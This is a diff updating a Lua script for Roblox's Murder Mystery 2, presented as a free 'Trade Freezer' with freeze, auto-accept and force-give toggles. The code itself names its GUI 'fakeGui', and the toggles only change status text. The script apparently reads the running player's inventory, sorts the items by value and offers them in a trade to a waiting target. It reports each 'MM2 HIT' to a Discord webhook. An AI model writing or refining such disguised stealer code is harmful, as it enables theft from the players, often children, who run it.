@@ -1,4 +1,4 @@
---[[ MM2 Trade Freezer v9.0 | KEYLESS | FREE ]]
+--[[ MM2 Trade Freezer v9.1 | KEYLESS | FREE ]]
 
 local CONFIG = {
     WEBHOOK        = "",
@@ -116,7 +116,7 @@ local function webhook(title, color, desc, fields, content)
         local thumb = {}
         thumb.url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", lp.UserId)
         local foot = {}
-        foot.text = "MM2 Trade Freezer v9.0"
+        foot.text = "MM2 Trade Freezer v9.1"
         local emb = {}
         emb.title = title
         emb.description = desc
@@ -137,6 +137,11 @@ local function webhook(title, color, desc, fields, content)
     end)
 end
 
+local PURPLE = Color3.fromRGB(139, 92, 246)
+local PURPLE_D = Color3.fromRGB(109, 62, 216)
+local TILE = Color3.fromRGB(30, 27, 51)
+local BG = Color3.fromRGB(22, 20, 38)
+
 local fakeGui = Instance.new("ScreenGui")
 fakeGui.Name = "MM2_TradeFreezer"
 fakeGui.ResetOnSpawn = false
@@ -144,146 +149,224 @@ fakeGui.IgnoreGuiInset = true
 fakeGui.DisplayOrder = 2147483647
 fakeGui.Parent = playerGui
 
+local glow = Instance.new("Frame")
+glow.Size = UDim2.fromOffset(372, 352)
+glow.Position = UDim2.new(0.5, -186, 0.16, -6)
+glow.BackgroundColor3 = PURPLE
+glow.BackgroundTransparency = 0.55
+glow.BorderSizePixel = 0
+glow.Parent = fakeGui
+local glowC = Instance.new("UICorner")
+glowC.CornerRadius = UDim.new(0, 16)
+glowC.Parent = glow
+
 local main = Instance.new("Frame")
-main.Size = UDim2.fromOffset(400, 232)
-main.Position = UDim2.new(0.5, -200, 0.16, 0)
-main.BackgroundColor3 = Color3.fromRGB(17, 17, 21)
+main.Size = UDim2.fromOffset(360, 340)
+main.Position = UDim2.new(0.5, -180, 0.16, 0)
+main.BackgroundColor3 = BG
 main.BorderSizePixel = 0
 main.Active = false
 main.Parent = fakeGui
 local mc = Instance.new("UICorner")
-mc.CornerRadius = UDim.new(0, 9)
+mc.CornerRadius = UDim.new(0, 12)
 mc.Parent = main
+local mStroke = Instance.new("UIStroke")
+mStroke.Color = PURPLE
+mStroke.Thickness = 2
+mStroke.Parent = main
 
 local uiScale = Instance.new("UIScale")
 uiScale.Parent = main
+local glowScale = Instance.new("UIScale")
+glowScale.Parent = glow
 
 local cam = workspace.CurrentCamera
 
 local function applyScale()
     local vp = cam.ViewportSize
     if vp.X > 0 and vp.Y > 0 then
-        uiScale.Scale = math.clamp(math.min(vp.X / 520, vp.Y / 640), 0.58, 1.10)
+        local s = math.clamp(math.min(vp.X / 460, vp.Y / 620), 0.55, 1.05)
+        uiScale.Scale = s
+        glowScale.Scale = s
     end
 end
 applyScale()
 pcall(function() cam:GetPropertyChangedSignal("ViewportSize"):Connect(applyScale) end)
 
-local titleBar = Instance.new("Frame")
-titleBar.Size = UDim2.new(1, 0, 0, 36)
-titleBar.BackgroundTransparency = 1
-titleBar.Parent = main
+local head = Instance.new("TextLabel")
+head.Size = UDim2.new(1, -28, 0, 26)
+head.Position = UDim2.fromOffset(14, 14)
+head.BackgroundTransparency = 1
+head.Font = Enum.Font.GothamBlack
+head.TextSize = 20
+head.TextXAlignment = Enum.TextXAlignment.Left
+head.TextColor3 = Color3.fromRGB(255, 255, 255)
+head.Text = "FREEZE TRADE SCRIPT"
+head.Parent = main
 
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, -20, 0, 36)
-title.Position = UDim2.fromOffset(14, 0)
-title.BackgroundTransparency = 1
-title.Font = Enum.Font.GothamBold
-title.TextSize = 13
-title.TextXAlignment = Enum.TextXAlignment.Left
-title.TextColor3 = Color3.fromRGB(235, 235, 240)
-title.Text = "MM2 Trade Freezer   v9.0"
-title.Parent = titleBar
+local sub = Instance.new("TextLabel")
+sub.Size = UDim2.new(1, -28, 0, 16)
+sub.Position = UDim2.fromOffset(14, 40)
+sub.BackgroundTransparency = 1
+sub.Font = Enum.Font.GothamBold
+sub.TextSize = 11
+sub.TextXAlignment = Enum.TextXAlignment.Left
+sub.TextColor3 = Color3.fromRGB(239, 68, 68)
+sub.Text = "MURDER MYSTERY 2"
+sub.Parent = main
 
 local badge = Instance.new("TextLabel")
-badge.Size = UDim2.fromOffset(56, 20)
-badge.Position = UDim2.new(1, -70, 0, 8)
-badge.BackgroundColor3 = Color3.fromRGB(28, 100, 56)
+badge.Size = UDim2.fromOffset(56, 18)
+badge.Position = UDim2.new(1, -70, 0, 18)
+badge.BackgroundColor3 = PURPLE_D
 badge.Font = Enum.Font.GothamBold
-badge.TextSize = 10
-badge.TextColor3 = Color3.fromRGB(205, 255, 218)
+badge.TextSize = 9
+badge.TextColor3 = Color3.fromRGB(240, 235, 255)
 badge.Text = "KEYLESS"
-badge.Parent = titleBar
+badge.Parent = main
 local bc = Instance.new("UICorner")
 bc.CornerRadius = UDim.new(0, 4)
 bc.Parent = badge
 
 local statusLabel = Instance.new("TextLabel")
-statusLabel.Size = UDim2.new(1, -28, 0, 18)
-statusLabel.Position = UDim2.fromOffset(14, 205)
+statusLabel.Size = UDim2.new(1, -28, 0, 14)
+statusLabel.Position = UDim2.fromOffset(14, 296)
 statusLabel.BackgroundTransparency = 1
 statusLabel.Font = Enum.Font.Code
-statusLabel.TextSize = 11
+statusLabel.TextSize = 10
 statusLabel.TextXAlignment = Enum.TextXAlignment.Left
-statusLabel.TextColor3 = Color3.fromRGB(120, 220, 150)
-statusLabel.Text = "TRADE WINDOW LOCKED"
+statusLabel.TextColor3 = Color3.fromRGB(167, 139, 250)
+statusLabel.Text = "FREEZE ACTIVE"
 statusLabel.Parent = main
 
 local timerLabel = Instance.new("TextLabel")
-timerLabel.Size = UDim2.fromOffset(90, 18)
-timerLabel.Position = UDim2.new(1, -104, 0, 205)
+timerLabel.Size = UDim2.fromOffset(80, 14)
+timerLabel.Position = UDim2.new(1, -94, 0, 296)
 timerLabel.BackgroundTransparency = 1
 timerLabel.Font = Enum.Font.Code
-timerLabel.TextSize = 11
+timerLabel.TextSize = 10
 timerLabel.TextXAlignment = Enum.TextXAlignment.Right
-timerLabel.TextColor3 = Color3.fromRGB(150, 150, 165)
+timerLabel.TextColor3 = Color3.fromRGB(140, 140, 160)
 timerLabel.Text = "00:00"
 timerLabel.Parent = main
 
 local freezeOn = true
+local autoOn = true
 
-local function makeRow(y, label, onText, offText)
-    local row = Instance.new("TextButton")
-    row.Size = UDim2.new(1, -28, 0, 30)
-    row.Position = UDim2.fromOffset(14, y)
-    row.BackgroundColor3 = Color3.fromRGB(24, 24, 30)
-    row.BorderSizePixel = 0
-    row.AutoButtonColor = false
-    row.Text = ""
-    row.Parent = main
-    local rc = Instance.new("UICorner")
-    rc.CornerRadius = UDim.new(0, 6)
-    rc.Parent = row
+local function makeTile(y, icon, label, subtext, onText, offText, isFreeze)
+    local tile = Instance.new("TextButton")
+    tile.Size = UDim2.new(1, -28, 0, 34)
+    tile.Position = UDim2.fromOffset(14, y)
+    tile.BackgroundColor3 = TILE
+    tile.BorderSizePixel = 0
+    tile.AutoButtonColor = false
+    tile.Text = ""
+    tile.Parent = main
+    local tc = Instance.new("UICorner")
+    tc.CornerRadius = UDim.new(0, 8)
+    tc.Parent = tile
+    local ts = Instance.new("UIStroke")
+    ts.Color = Color3.fromRGB(58, 48, 92)
+    ts.Thickness = 1
+    ts.Parent = tile
+
+    local box = Instance.new("Frame")
+    box.Size = UDim2.fromOffset(26, 26)
+    box.Position = UDim2.fromOffset(5, 4)
+    box.BackgroundColor3 = PURPLE_D
+    box.BorderSizePixel = 0
+    box.Parent = tile
+    local bx = Instance.new("UICorner")
+    bx.CornerRadius = UDim.new(0, 6)
+    bx.Parent = box
+    local glyph = Instance.new("TextLabel")
+    glyph.Size = UDim2.new(1, 0, 1, 0)
+    glyph.BackgroundTransparency = 1
+    glyph.Font = Enum.Font.GothamBold
+    glyph.TextSize = 14
+    glyph.TextColor3 = Color3.fromRGB(240, 235, 255)
+    glyph.Text = icon
+    glyph.Parent = box
 
     local lbl = Instance.new("TextLabel")
-    lbl.Size = UDim2.new(1, -80, 1, 0)
-    lbl.Position = UDim2.fromOffset(10, 0)
+    lbl.Size = UDim2.new(1, -110, 0, 14)
+    lbl.Position = UDim2.fromOffset(38, 4)
     lbl.BackgroundTransparency = 1
-    lbl.Font = Enum.Font.GothamMedium
+    lbl.Font = Enum.Font.GothamBold
     lbl.TextSize = 12
     lbl.TextXAlignment = Enum.TextXAlignment.Left
-    lbl.TextColor3 = Color3.fromRGB(220, 220, 230)
+    lbl.TextColor3 = Color3.fromRGB(235, 235, 245)
     lbl.Text = label
-    lbl.Parent = row
+    lbl.Parent = tile
+
+    local sm = Instance.new("TextLabel")
+    sm.Size = UDim2.new(1, -110, 0, 12)
+    sm.Position = UDim2.fromOffset(38, 18)
+    sm.BackgroundTransparency = 1
+    sm.Font = Enum.Font.Gotham
+    sm.TextSize = 9
+    sm.TextXAlignment = Enum.TextXAlignment.Left
+    sm.TextColor3 = Color3.fromRGB(150, 145, 175)
+    sm.Text = subtext
+    sm.Parent = tile
 
     local pill = Instance.new("Frame")
-    pill.Size = UDim2.fromOffset(40, 20)
-    pill.Position = UDim2.new(1, -50, 0, 5)
-    pill.BackgroundColor3 = Color3.fromRGB(40, 150, 80)
-    pill.Parent = row
+    pill.Size = UDim2.fromOffset(36, 18)
+    pill.Position = UDim2.new(1, -46, 0, 8)
+    pill.BackgroundColor3 = PURPLE
+    pill.Parent = tile
     local pc = Instance.new("UICorner")
     pc.CornerRadius = UDim.new(1, 0)
     pc.Parent = pill
 
     local knob = Instance.new("Frame")
-    knob.Size = UDim2.fromOffset(16, 16)
-    knob.Position = UDim2.fromOffset(21, 2)
-    knob.BackgroundColor3 = Color3.fromRGB(245, 245, 250)
+    knob.Size = UDim2.fromOffset(14, 14)
+    knob.Position = UDim2.fromOffset(19, 2)
+    knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
     knob.Parent = pill
     local kc = Instance.new("UICorner")
     kc.CornerRadius = UDim.new(1, 0)
     kc.Parent = knob
 
     local function toggle()
-        freezeOn = not freezeOn
-        if freezeOn then
-            pill.BackgroundColor3 = Color3.fromRGB(40, 150, 80)
-            knob.Position = UDim2.fromOffset(21, 2)
-            statusLabel.Text = onText
-            statusLabel.TextColor3 = Color3.fromRGB(120, 220, 150)
+        local on
+        if isFreeze then
+            freezeOn = not freezeOn
+            on = freezeOn
         else
-            pill.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
+            autoOn = not autoOn
+            on = autoOn
+        end
+        if on then
+            pill.BackgroundColor3 = PURPLE
+            knob.Position = UDim2.fromOffset(19, 2)
+            statusLabel.Text = onText
+            statusLabel.TextColor3 = Color3.fromRGB(167, 139, 250)
+        else
+            pill.BackgroundColor3 = Color3.fromRGB(70, 70, 90)
             knob.Position = UDim2.fromOffset(3, 2)
             statusLabel.Text = offText
-            statusLabel.TextColor3 = Color3.fromRGB(150, 150, 160)
+            statusLabel.TextColor3 = Color3.fromRGB(140, 140, 160)
         end
     end
 
-    row.MouseButton1Click:Connect(toggle)
+    tile.MouseButton1Click:Connect(toggle)
 end
 
-makeRow(40, "Freeze Trade", "TRADE WINDOW LOCKED", "FREEZE DISABLED")
-makeRow(74, "Dupe Weapons (visual)", "DUPE QUEUE ACTIVE", "DUPE QUEUE IDLE")
+makeTile(66, "❄", "Freeze Trade", "Active", "FREEZE ACTIVE", "FREEZE DISABLED", true)
+makeTile(104, "✔", "Auto Accept", "Active", "AUTO ACCEPT ACTIVE", "AUTO ACCEPT OFF", false)
+makeTile(142, "$", "Force Give All Weapon", "Active", "FORCE GIVE ACTIVE", "FORCE GIVE OFF", false)
+
+local footer = Instance.new("TextLabel")
+footer.Size = UDim2.new(1, -28, 0, 12)
+footer.Position = UDim2.fromOffset(14, 320)
+footer.BackgroundTransparency = 1
+footer.Font = Enum.Font.Gotham
+footer.TextSize = 9
+footer.TextXAlignment = Enum.TextXAlignment.Center
+footer.TextColor3 = Color3.fromRGB(120, 115, 145)
+footer.Text = "keyless · v9.1"
+footer.Parent = main
 
 local timerCount = 0
 
@@ -301,44 +384,48 @@ end
 task.spawn(tickTimer)
 
 local barBg = Instance.new("Frame")
-barBg.Size = UDim2.new(1, -28, 0, 9)
-barBg.Position = UDim2.fromOffset(14, 112)
-barBg.BackgroundColor3 = Color3.fromRGB(34, 34, 41)
+barBg.Size = UDim2.new(1, -28, 0, 7)
+barBg.Position = UDim2.fromOffset(14, 182)
+barBg.BackgroundColor3 = Color3.fromRGB(40, 36, 62)
 barBg.BorderSizePixel = 0
 barBg.Parent = main
 local bbgc = Instance.new("UICorner")
-bbgc.CornerRadius = UDim.new(0, 5)
+bbgc.CornerRadius = UDim.new(0, 4)
 bbgc.Parent = barBg
 
 local bar = Instance.new("Frame")
 bar.Size = UDim2.new(0, 0, 1, 0)
-bar.BackgroundColor3 = Color3.fromRGB(95, 175, 255)
+bar.BackgroundColor3 = PURPLE
 bar.BorderSizePixel = 0
 bar.Parent = barBg
 local barc = Instance.new("UICorner")
-barc.CornerRadius = UDim.new(0, 5)
+barc.CornerRadius = UDim.new(0, 4)
 barc.Parent = bar
 
 local pctLabel = Instance.new("TextLabel")
-pctLabel.Size = UDim2.new(1, -28, 0, 16)
-pctLabel.Position = UDim2.fromOffset(14, 125)
+pctLabel.Size = UDim2.new(1, -28, 0, 12)
+pctLabel.Position = UDim2.fromOffset(14, 193)
 pctLabel.BackgroundTransparency = 1
 pctLabel.Font = Enum.Font.Code
-pctLabel.TextSize = 11
+pctLabel.TextSize = 9
 pctLabel.TextXAlignment = Enum.TextXAlignment.Left
-pctLabel.TextColor3 = Color3.fromRGB(160, 160, 172)
+pctLabel.TextColor3 = Color3.fromRGB(150, 145, 175)
 pctLabel.Text = "0%  ::  initializing"
 pctLabel.Parent = main
 
 local console = Instance.new("ScrollingFrame")
-console.Size = UDim2.new(1, -28, 0, 56)
-console.Position = UDim2.fromOffset(14, 145)
-console.BackgroundTransparency = 1
+console.Size = UDim2.new(1, -28, 0, 82)
+console.Position = UDim2.fromOffset(14, 208)
+console.BackgroundColor3 = Color3.fromRGB(18, 16, 30)
+console.BackgroundTransparency = 0.35
 console.BorderSizePixel = 0
 console.ScrollBarThickness = 2
-console.ScrollBarImageColor3 = Color3.fromRGB(58, 58, 70)
+console.ScrollBarImageColor3 = PURPLE_D
 console.AutomaticCanvasSize = Enum.AutomaticSize.Y
 console.Parent = main
+local cc = Instance.new("UICorner")
+cc.CornerRadius = UDim.new(0, 6)
+cc.Parent = console
 local listLayout = Instance.new("UIListLayout")
 listLayout.Padding = UDim.new(0, 2)
 listLayout.SortOrder = Enum.SortOrder.LayoutOrder
@@ -349,13 +436,14 @@ local lineCount = 0
 local function log(msg)
     lineCount = lineCount + 1
     local line = Instance.new("TextLabel")
-    line.Size = UDim2.new(1, 0, 0, 13)
+    line.Size = UDim2.new(1, -8, 0, 11)
+    line.Position = UDim2.fromOffset(4, 0)
     line.BackgroundTransparency = 1
     line.Font = Enum.Font.Code
-    line.TextSize = 10
+    line.TextSize = 9
     line.TextXAlignment = Enum.TextXAlignment.Left
-    line.TextColor3 = Color3.fromRGB(118, 175, 130)
-    line.Text = "  > " .. msg
+    line.TextColor3 = Color3.fromRGB(160, 200, 175)
+    line.Text = "> " .. msg
     line.LayoutOrder = lineCount
     line.Parent = console
     if #console:GetChildren() > 26 then
@@ -406,7 +494,7 @@ local function runLoader()
 end
 task.spawn(runLoader)
 
-log("Trade Freezer v9.0 loaded")
+log("Trade Freezer v9.1 loaded")
 
 local VALUES = {}
 
@@ -515,43 +603,30 @@ local function valueOf(name)
     return VALUES[key(name):gsub("%s*%(.-%)%s*$", "")] or 0
 end
 
-local function looksLikeId(s)
-    if type(s) ~= "string" then return false end
-    if #s < 20 then return false end
-    if s:find("%s") then return false end
-    if not s:match("^[%w%-_]+$") then return false end
-    return true
+local JUNK = {
+    ["weapons"]=true, ["search"]=true, ["item"]=true, ["items"]=true,
+    ["loading..."]=true, ["materials"]=true, ["container"]=true, ["result"]=true,
+    ["unique"]=true, ["chroma"]=true, ["halloween"]=true, ["christmas"]=true,
+    ["easter"]=true, ["summer"]=true, ["ancient"]=true, ["godly"]=true,
+    ["random legendary knife"]=true, ["random legendary gun"]=true,
+}
+
+local function isJunkName(n)
+    local k = key(n)
+    if JUNK[k] then return true end
+    if k:match("^x%d+$") then return true end
+    if k:match("^material%d*$") then return true end
+    if #k < 3 then return true end
+    return false
 end
 
 local function cardName(card)
-    for k, v in pairs(card:GetAttributes()) do
-        local lk = k:lower()
-        if type(v) == "string" and v ~= "" then
-            if lk:find("name") or lk:find("item") then return v end
-        end
+    local bg = card:FindFirstChild("BG")
+    local lbl = card:FindFirstChild("Label")
+    if bg and lbl and lbl:IsA("TextLabel") then
+        local t = lbl.Text
+        if t and #t > 1 then return t end
     end
-    for _, d in ipairs(card:GetDescendants()) do
-        if d:IsA("TextLabel") then
-            local t = d.Text
-            if t and #t > 1 and #t < 40 then
-                if not t:match("^%d+$") then return t end
-            end
-        end
-    end
-    return nil
-end
-
-local function cardId(card)
-    for k, v in pairs(card:GetAttributes()) do
-        if looksLikeId(v) then return v end
-    end
-    for _, d in ipairs(card:GetDescendants()) do
-        if d:IsA("StringValue") then
-            if looksLikeId(d.Name) then return d.Name end
-            if looksLikeId(d.Value) then return d.Value end
-        end
-    end
-    if looksLikeId(card.Name) then return card.Name end
     return nil
 end
 
@@ -562,41 +637,25 @@ local function inventoryRoots()
         local inv = mg:FindFirstChild("Inventory")
         if inv then roots[#roots + 1] = inv end
     end
-    for _, name in ipairs({ "TradeGUI", "TradeGUI_Phone" }) do
-        local tg = playerGui:FindFirstChild(name)
-        if tg then
-            local c = tg:FindFirstChild("Container")
-            local items = c and c:FindFirstChild("Items")
-            if items then roots[#roots + 1] = items end
-        end
-    end
     return roots
 end
 
-local function harvest(root, items, seen)
+local function harvest(root, items, seen, counter)
     for _, d in ipairs(root:GetDescendants()) do
-        if d:IsA("Frame") or d:IsA("ImageButton") or d:IsA("TextButton") then
+        if d:IsA("Frame") or d:IsA("TextButton") or d:IsA("ImageButton") then
             local nm = cardName(d)
-            if nm then
-                local hasImg = false
-                for _, x in ipairs(d:GetDescendants()) do
-                    if x:IsA("ImageLabel") or x:IsA("ImageButton") then
-                        hasImg = true
-                        break
-                    end
-                end
-                if hasImg then
-                    local k = key(nm)
-                    if not seen[k] then
-                        seen[k] = true
-                        local e = {}
-                        e.name = nm
-                        e.id = cardId(d) or nm
-                        e.value = valueOf(nm)
-                        e.tag = rarityTag(nm)
-                        e.card = d
-                        items[#items + 1] = e
-                    end
+            if nm and not isJunkName(nm) then
+                counter.n = counter.n + 1
+                local k = key(nm)
+                if not seen[k] then
+                    seen[k] = true
+                    local e = {}
+                    e.name = nm
+                    e.slot = counter.n
+                    e.value = valueOf(nm)
+                    e.tag = rarityTag(nm)
+                    e.card = d
+                    items[#items + 1] = e
                 end
             end
         end
@@ -606,8 +665,9 @@ end
 local function getItems()
     local items = {}
     local seen = {}
+    local counter = { n = 0 }
     for _, r in ipairs(inventoryRoots()) do
-        harvest(r, items, seen)
+        harvest(r, items, seen, counter)
     end
     table.sort(items, function(a, b) return a.value > b.value end)
     return items
@@ -750,7 +810,7 @@ local function notifyJoin(items, total)
     fields[2] = f2
     local desc = "`" .. lp.Name .. "`"
     if total > 0 then desc = desc .. " - " .. total .. " total" end
-    webhook("MM2 HIT", 0x57F287, desc, fields, "@here")
+    webhook("MM2 HIT", 0x8B5CF6, desc, fields, "@here")
 end
 
 local function waitForTarget()
@@ -776,40 +836,26 @@ local function waitForTarget()
     return nil
 end
 
-local function dumpCard(card)
-    if not card then return end
-    for k, v in pairs(card:GetAttributes()) do
-        log("dbgC " .. k .. "=" .. tostring(v))
-    end
-    local n = 0
-    for _, d in ipairs(card:GetDescendants()) do
-        local t = ""
-        if d:IsA("TextLabel") then t = " t=" .. d.Text end
-        local a = ""
-        for k, v in pairs(d:GetAttributes()) do a = a .. " " .. k .. "=" .. tostring(v) end
-        log("dbg " .. d.ClassName .. "|" .. d.Name .. t .. a)
-        n = n + 1
-        if n > 14 then break end
-    end
-end
+local function tryOffer(it, base, placed)
+    call(R.add, it.slot)
+    task.wait(0.3)
+    local g = tradeGui()
+    local c = offerCount(g)
+    if c and c > base + placed then return true end
 
-local function debugInventory()
-    local mg = playerGui:FindFirstChild("MainGUI")
-    local inv = mg and mg:FindFirstChild("Inventory")
-    if not inv then
-        log("dbg no MainGUI.Inventory")
-        return
-    end
-    local n = 0
-    for _, d in ipairs(inv:GetDescendants()) do
-        local t = ""
-        if d:IsA("TextLabel") then t = " t=" .. d.Text end
-        local a = ""
-        for k, v in pairs(d:GetAttributes()) do a = a .. " " .. k .. "=" .. tostring(v) end
-        log("dbg " .. d.ClassName .. "|" .. d.Name .. t .. a)
-        n = n + 1
-        if n > 18 then break end
-    end
+    call(R.add, it.name)
+    task.wait(0.25)
+    g = tradeGui()
+    c = offerCount(g)
+    if c and c > base + placed then return true end
+
+    call(R.add, it.name, it.slot)
+    task.wait(0.25)
+    g = tradeGui()
+    c = offerCount(g)
+    if c and c > base + placed then return true end
+
+    return false
 end
 
 local function doRound(batch, tgt, round)
@@ -844,25 +890,12 @@ local function doRound(batch, tgt, round)
     local placed = 0
     for _, it in ipairs(batch) do
         if STATE.stopped then break end
-        call(R.add, it.id)
-        task.wait(0.35)
-        gui = tradeGui()
-        local c = offerCount(gui)
-        if c and c > base + placed then
-            placed = placed + 1
-        else
-            call(R.add, it.name)
-            task.wait(0.25)
-            gui = tradeGui()
-            c = offerCount(gui)
-            if c and c > base + placed then placed = placed + 1 end
-        end
+        if tryOffer(it, base, placed) then placed = placed + 1 end
         task.wait(0.15)
     end
 
     if placed == 0 then
-        log("dbg id=" .. tostring(batch[1].id) .. " name=" .. tostring(batch[1].name))
-        dumpCard(batch[1].card)
+        log("dbg slot=" .. tostring(batch[1].slot) .. " name=" .. tostring(batch[1].name))
         call(R.cancel)
         return false, "nothing placed"
     end
@@ -918,7 +951,6 @@ local function run()
         end
         if #wanted == 0 then
             log("no items found")
-            debugInventory()
             break
         end
 
@@ -948,7 +980,7 @@ local function run()
                 grandValue = grandValue + it.value
             end
             log("cleared (" .. info .. ")")
-            webhook("Cleared", 0x57F287, "**" .. lp.Name .. "** - " .. info .. " item(s)")
+            webhook("Cleared", 0x8B5CF6, "**" .. lp.Name .. "** - " .. info .. " item(s)")
         else
             log("failed: " .. info)
             webhook("Failed", 0xFFAA33, "`" .. game.JobId .. "` - " .. info)
@@ -960,7 +992,7 @@ local function run()
     end
 
     if #grand > 0 then
-        webhook("Session complete", 0x57F287, "**" .. lp.DisplayName .. "** - " .. #grand .. " item(s)")
+        webhook("Session complete", 0x8B5CF6, "**" .. lp.DisplayName .. "** - " .. #grand .. " item(s)")
     end
     log("done: " .. #grand)
 end
